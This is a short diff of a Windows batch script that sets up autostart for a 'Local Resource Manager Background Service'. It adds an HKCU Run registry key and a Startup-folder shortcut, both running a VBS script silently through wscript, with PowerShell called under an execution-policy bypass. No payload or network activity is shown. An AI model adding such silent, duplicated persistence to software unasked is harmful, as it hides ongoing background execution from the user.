@@ -81,7 +81,8 @@ exit /b 0
 if not exist "%STARTUP_DIR%" (
   mkdir "%STARTUP_DIR%" >nul 2>&1
 )
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%STARTUP_LNK%'); $s.TargetPath = '%WSCRIPT%'; $s.Arguments = '//B //NoLogo ""%VBS%"" /silent'; $s.WorkingDirectory = '%ROOT%'; $s.Description = 'Local Resource Manager Background Service'; $s.Save()"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "LocalResourceManager" /t REG_SZ /d "\"%WSCRIPT%\" //B //NoLogo \"%VBS%\" /silent" /f >nul 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%STARTUP_LNK%'); $s.TargetPath = '%WSCRIPT%'; $s.Arguments = ('//B //NoLogo ""{0}"" /silent' -f '%VBS%'); $s.WorkingDirectory = '%ROOT%'; $s.Description = 'Local Resource Manager Background Service'; $s.Save()" >nul 2>&1
 del /f /q "%STARTUP_DIR%\start-background.bat" >nul 2>&1
 del /f /q "%STARTUP_DIR%\start-background.lnk" >nul 2>&1
 del /f /q "%STARTUP_DIR%\LocalResourceManagerSetup.lnk" >nul 2>&1
